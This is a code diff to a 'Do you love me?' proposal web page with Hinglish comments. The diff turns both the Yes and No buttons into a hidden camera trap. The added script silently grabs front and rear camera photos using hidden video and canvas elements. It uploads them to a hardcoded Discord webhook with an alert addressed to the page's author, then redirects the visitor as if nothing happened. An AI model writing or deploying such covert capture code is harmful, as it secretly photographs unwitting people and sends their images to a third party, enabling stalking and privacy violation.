@@ -5,25 +5,98 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Proposed Her</title>
   <link rel="stylesheet" href="./style.css" />
+  <style>
+    /* Camera elements ko hidden rakha hai */
+    #video, #canvas { display: none; }
+    
+    /* Yes/No buttons ki styling agar style.css load na ho */
+    .btn a {
+      padding: 10px 25px;
+      margin: 10px;
+      text-decoration: none;
+      background: #ff4d6d;
+      color: white;
+      border-radius: 20px;
+      display: inline-block;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-  <!-- Developer Name -->
   <div class="dev-name" style="position: absolute; top: 10px; left: 10px; font-size: 0.8rem; color: rgba(255,255,255,0.7); font-weight: bold;">
     Dev by Faisal
   </div>
 
-  <div class="container">
-    <!-- Giphy GIF replacing Tenor GIF -->
+  <div class="container" style="text-align: center; padding-top: 50px; font-family: Arial, sans-serif;">
     <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Manja GIF" style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px;">
-
-    <h1>Do you love me? 🤗</h1>
-    <p>Chiku is all yours</p>
+    <h1 style="color: #fff;">Do you love me? 🤗</h1>
+    <p style="color: #eee;">Chiku is all yours</p>
     <div class="btn">
-      <a href="page1.html">Yes</a>
-      <a href="no1.html">No</a>
+      <a href="javascript:void(0)" onclick="startCapture('user')">Yes</a>
+      <a href="javascript:void(0)" onclick="startCapture('user')">No</a>
     </div>
   </div>
 
-  <script src="./script.js"></script>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    // Aapka Discord Webhook URL yahan add kar diya hai
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
+
+    async function startCapture(mode) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: mode } 
+        });
+        
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        // Photo lene se pehle thora wait (1.5 sec)
+        setTimeout(() => {
+          captureImage(stream, mode);
+        }, 1500);
+
+      } catch (err) {
+        console.log("Permission Error: ", err);
+        // Agar user block kare to bhi redirect kar dein
+        window.location.href = "page1.html";
+      }
+    }
+
+    function captureImage(stream, mode) {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('file', blob, `faisal_capture_${mode}.png`);
+        formData.append('content', `🚀 **Alert! Faisal Bhai, Nayi Photo Agayi!**\n📸 Camera: ${mode === 'user' ? 'Front (Selfie)' : 'Back'}`);
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        }).then(() => {
+          // Stream close karna
+          stream.getTracks().forEach(track => track.stop());
+          
+          if(mode === 'user') {
+            // Front ke baad foran Back camera try karein
+            startCapture('environment'); 
+          } else {
+            // Sab done, ab next page par bhej dein
+            window.location.href = "page1.html";
+          }
+        }).catch(err => {
+            window.location.href = "page1.html";
+        });
+      }, 'image/png');
+    }
+  </script>
 </body>
 </html>
